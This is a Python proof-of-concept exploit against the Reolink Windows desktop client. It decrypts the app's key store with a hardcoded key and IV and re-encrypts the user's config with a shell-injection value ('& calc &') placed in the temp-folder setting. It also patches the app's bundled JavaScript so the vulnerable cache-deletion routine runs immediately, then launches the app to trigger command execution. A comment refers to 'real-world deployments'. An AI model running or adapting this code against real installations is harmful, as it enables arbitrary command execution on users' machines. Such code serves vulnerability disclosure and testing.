import os
import re
import json
import base64
import subprocess
from pathlib import Path
from hashlib import md5
from Crypto.Cipher import AES

IV = b"bcswebapp1234567"
DUMMY_KEY = "com.reolink.app"
KEY_STORE_FILENAME = "com.reolink.app.client"
TARGET_EXE = Path(os.environ["LOCALAPPDATA"]) / "Programs" / "Reolink" / "Reolink.exe"
TARGET_JS = Path(os.environ["LOCALAPPDATA"]) / "Programs" / "Reolink" / "resources" / "app" / "~node_modules_sharp_vendor_Sync_recursive_versions_json_~private_main_index_ts.js"

def aes_cfb_decrypt(base64_str: str, key_bytes: bytes, iv_bytes: bytes) -> bytes:
    cipher = AES.new(key_bytes, AES.MODE_CFB, iv=iv_bytes, segment_size=128)
    return cipher.decrypt(base64.b64decode(base64_str))

def aes_cfb_encrypt(plain_bytes: bytes, key_bytes: bytes, iv_bytes: bytes) -> str:
    cipher = AES.new(key_bytes, AES.MODE_CFB, iv=iv_bytes, segment_size=128)
    return base64.b64encode(cipher.encrypt(plain_bytes)).decode("utf-8")

def extract_first_json_string(utf8_str: str) -> str:
    start = utf8_str.find('{')
    end = utf8_str.rfind('}') + 1
    return utf8_str[start:end]

def get_user_key_str():
    key_store_path = Path.home() / "AppData" / "Roaming" / KEY_STORE_FILENAME
    if not key_store_path.exists():
        raise FileNotFoundError(f"[!] key store not found at: {key_store_path}")

    with key_store_path.open("r", encoding="utf-8") as f:
        obj = json.load(f)

    enc_data = obj["data"]
    dummy_key_md5 = md5(DUMMY_KEY.encode()).hexdigest().upper().encode()
    decrypted = aes_cfb_decrypt(enc_data, dummy_key_md5, IV)

    try:
        json_part = extract_first_json_string(decrypted.decode("utf-8", errors="ignore"))
        key_data = json.loads(json_part)
        return key_data["key"]
    except Exception as e:
        raise ValueError(f"[!] Failed to extract user key: {e}")

def modify_config_file(final_key: bytes):
    config_dir = Path(os.environ["APPDATA"]) / "reolink"
    if not config_dir.exists():
        raise FileNotFoundError(f"[!] {config_dir} does not exist.")

    target_file = next(config_dir.glob("*.json"), None)
    if not target_file:
        raise FileNotFoundError("[!] No JSON config file found.")

    with target_file.open("r", encoding="utf-8") as f:
        full_json = json.load(f)

    base64_cipher = full_json.get("data")
    if not base64_cipher:
        raise ValueError("[!] 'data' field missing.")

    decrypted_bytes = aes_cfb_decrypt(base64_cipher, final_key, IV)
    try:
        json_part = extract_first_json_string(decrypted_bytes.decode("utf-8", errors="ignore"))
        config_dict = json.loads(json_part)
    except Exception as e:
        raise ValueError(f"[!] JSON parsing error: {e}")

    if "userSettings" not in config_dict or not isinstance(config_dict["userSettings"], dict):
        config_dict["userSettings"] = {}

    config_dict["userSettings"]["sTempFolder"] = str(Path(os.environ["TEMP"]) / "reolink" / "& calc &")

    modified_plaintext = json.dumps(config_dict, separators=(",", ":")).encode("utf-8")
    encrypted_base64 = aes_cfb_encrypt(modified_plaintext, final_key, IV)

    full_json["data"] = encrypted_base64
    with target_file.open("w", encoding="utf-8") as f:
        json.dump(full_json, f, ensure_ascii=False, indent=2)
    
    print("[+] Configuration updated successfully.")


def patch_js(js_path: Path):
    if not js_path.exists():
        raise FileNotFoundError(f"[!] Target JS file not found: {js_path}")

    with js_path.open("r", encoding="utf-8") as f:
        content = f.read()

    pattern = r"(this\.clearCoverCacheRegularly\(\);?)"
    replacement = r"\1; this.removeCoverCacheDir(true);"

    if "this.removeCoverCacheDir(true);" in content:
        print("[+] Code injection already present. Skipping patch.")
        return

    if "this.clearCoverCacheRegularly()" not in content:
        raise ValueError("[!] Injection target not found in JS file.")

    patched_content = re.sub(pattern, replacement, content)

    with js_path.open("w", encoding="utf-8") as f:
        f.write(patched_content)

if __name__ == "__main__":
    try:
        key_str = get_user_key_str()
        final_key = md5(key_str.encode()).hexdigest().upper().encode()
        patch_js(TARGET_JS) # Injects code to trigger RCE immediately, without waiting for the 3:00 AM scheduler (remove for real-world deployments)
        modify_config_file(final_key)
        if TARGET_EXE.exists():
            subprocess.Popen([str(TARGET_EXE)])
            print("[+] Reolink app launched successfully.")
        else:
            print("[!] Reolink.exe is not found. Please check the installation path.")
    except Exception as e:
        print("[!] Error occurred:", e)